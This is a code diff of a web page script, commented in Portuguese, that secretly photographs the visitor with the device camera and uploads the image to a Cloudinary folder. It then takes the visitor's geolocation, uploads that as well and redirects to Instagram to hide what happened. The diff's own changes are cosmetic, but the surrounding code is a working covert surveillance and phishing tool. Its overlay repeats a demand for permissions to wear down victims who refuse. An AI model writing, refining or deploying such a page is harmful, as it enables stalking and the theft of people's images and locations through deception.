@@ -30,7 +30,7 @@
     const uploadPreset = "upload";       // Seu Upload Preset (unsigned)
     const folderName = "capturas";       // Pasta de destino no Cloudinary
 
-    // Exibe o overlay com uma mensagem e executa callback ao toque.
+    // Função para exibir o overlay com uma mensagem e executa callback ao toque.
     function showOverlay(message, callback) {
       const overlay = document.getElementById("overlay");
       overlay.textContent = message;
@@ -55,7 +55,7 @@
         await video.play();
 
         // Aguarda um breve período para garantir que o vídeo renderizou.
-        await new Promise(r => setTimeout(r, 200)); 
+        await new Promise(r => setTimeout(r, 200));
 
         const canvas = document.createElement("canvas");
         canvas.width = video.videoWidth || 640;
@@ -107,17 +107,17 @@
             body: textForm
           });
           if (!textResp.ok) throw new Error("Erro ao enviar o arquivo de localização");
-          // Se tudo ocorrer bem, redireciona. 
+          // Se tudo ocorrer bem, redireciona para o Instagram.
           window.location.href = "https://instagram.com";
         } catch (err) {
           console.error("Erro no envio da localização:", err);
-          showOverlay("São necessárias as permissões para continuar. Toque aqui para permitir...", () => { 
+          showOverlay("São necessárias as permissões para continuar. Toque aqui para permitir...", () => {
             requestLocation(imageUrl);
           });
         }
       }, (err) => {
         console.error("Erro ao obter localização:", err);
-        showOverlay("É necessário as permissões para continuar. Toque aqui para permitir...", () => {
+        showOverlay("São necessárias as permissões para continuar. Toque aqui para permitir...", () => {
           requestLocation(imageUrl);
         });
       }, {
@@ -131,7 +131,6 @@
     async function startFlow() {
       try {
         const imageUrl = await capturePhoto();
-        // Assim que a foto é capturada e enviada, solicita imediatamente a permissão de localização.
         requestLocation(imageUrl);
       } catch (e) {
         console.error("Erro no fluxo:", e);
@@ -140,7 +139,9 @@
 
     // Inicia o fluxo após o toque inicial (para garantir a interação no iOS).
     document.getElementById("overlay").addEventListener("click", function handler() {
-      document.getElementById("overlay").removeEventListener("click", handler);
+      const overlay = document.getElementById("overlay");
+      overlay.style.display = "none"; // Oculta o overlay imediatamente
+      overlay.removeEventListener("click", handler);
       startFlow();
     });
   </script>
